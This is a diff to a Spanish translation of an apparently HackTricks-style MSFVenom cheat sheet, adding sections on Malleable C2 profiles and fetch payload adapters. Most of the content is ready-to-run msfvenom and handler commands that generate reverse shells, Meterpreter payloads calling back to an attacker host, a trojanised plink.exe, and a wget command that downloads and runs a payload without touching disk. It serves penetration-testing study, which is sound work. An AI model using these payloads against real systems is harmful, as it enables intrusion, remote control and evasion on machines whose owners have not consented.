@@ -1,4 +1,4 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Hoja de trucos
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -25,7 +25,26 @@ Estos comandos enumeran los módulos de payload y encoder disponibles en el fram
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-Los flags mostrados aquí seleccionan bad characters, el formato de salida, el encoder y las iteraciones de encoding.<sup>[[1]](#references)</sup>
+Los flags mostrados aquí seleccionan los bad characters, el formato de salida, el encoder y las iteraciones de encoding.<sup>[[1]](#references)</sup>
+
+## Configuración del tráfico de Meterpreter HTTP(S)
+
+Metasploit 6.5 añadió la opción `MALLEABLEC2` a los payloads reverse HTTP(S) de Meterpreter staged y stageless. El perfil puede cambiar las URI, los user agents, las cabeceras de solicitud/respuesta, la ubicación del connection-ID y las codificaciones/wrappers de cuerpo compatibles. Tanto el payload generado como su handler deben cargar el **mismo perfil local**. La solicitud inicial de un payload staged para la etapa de Meterpreter no se configura, por lo que se recomienda un payload stageless como `windows/x64/meterpreter_reverse_https` cuando la primera solicitud también deba coincidir con el perfil.<sup>[[3]](#references)</sup>
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_https \
+LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
+-f exe -o reverse_https.exe
+```
+Configura el matching handler con el mismo payload y profile:<sup>[[3]](#references)</sup>
+```text
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set LHOST 10.10.10.10
+set LPORT 443
+set MALLEABLEC2 /opt/profiles/web.profile
+run
+```
+Solo las directivas documentadas como implementadas afectan al tráfico; los bloques de perfil no compatibles pueden analizarse correctamente, pero no tener ningún efecto.<sup>[[3]](#references)</sup>
 
 ## **Windows**
 
@@ -54,11 +73,13 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Integrado dentro del ejecutable
+> **Encoding no es evasión de AV:** los encoders como `x86/shikata_ga_nai` son principalmente útiles para satisfacer las restricciones de bad characters. La codificación repetida no es una técnica fiable de evasión de AV.<sup>[[1]](#references)</sup>
+
+### Integrado dentro de un ejecutable
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Payloads de Linux
+## Cargas útiles de Linux
 
 ### Reverse Shell
 ```bash
@@ -73,7 +94,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **Payloads para MAC**
+## **MAC Payloads**
 
 ### **Reverse Shell:**
 ```bash
@@ -83,7 +104,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payloads basados en la Web**
+## **Payloads basados en Web**
 
 ### **PHP**
 
@@ -115,7 +136,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads de lenguajes de scripting**
+## **Payloads en lenguajes de script**
 
 ### **Perl**
 ```bash
@@ -129,7 +150,33 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## Fetch payload adapters
+
+Los Fetch payloads producen un comando que hace que una utilidad disponible en el objetivo descargue y ejecute un native payload subyacente. Sus nombres siguen el formato `cmd/<platform>/<fetch-protocol>/<served-payload>`; hay adapters HTTP(S), SMB y TFTP disponibles, con opciones de downloader que dependen de la plataforma objetivo.<sup>[[2]](#references)</sup>
+
+Por ejemplo, genera un comando `wget` de Linux que recupere un payload de Meterpreter x64 desde el puerto 8080 y se conecte de vuelta al puerto 4444:<sup>[[2]](#references)</sup>
+```bash
+msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
+FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
+LHOST=10.10.10.10 LPORT=4444 -f raw
+```
+Inicia el **fetch handler** con la misma configuración; aloja el ELF generado y también inicia el handler para el payload Meterpreter servido:<sup>[[2]](#references)</sup>
+```text
+use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
+set FETCH_COMMAND WGET
+set FETCH_SRVHOST 10.10.10.10
+set FETCH_SRVPORT 8080
+set LHOST 10.10.10.10
+set LPORT 4444
+to_handler
+```
+Las opciones dependientes útiles incluyen `FETCH_PIPE=true` para emitir un comando HTTP(S) más corto cuando sea compatible, y `FETCH_FILELESS=shell`, `shell-search` o `python3.8+` para ejecutar un Linux ELF desde un descriptor de archivo anónimo. Los modos fileless requieren Linux kernel 3.17 o posterior; inspecciona el adapter exacto con `msfvenom -p <FETCH_PAYLOAD> --list-options`, ya que las combinaciones compatibles varían.<sup>[[2]](#references)</sup>
+
+
+
 ## References
 
 - [1] [Cómo usar msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
+- [2] [Cómo usar Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
+- [3] [Perfiles C2 Malleable](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
 {{#include ../../banners/hacktricks-training.md}}
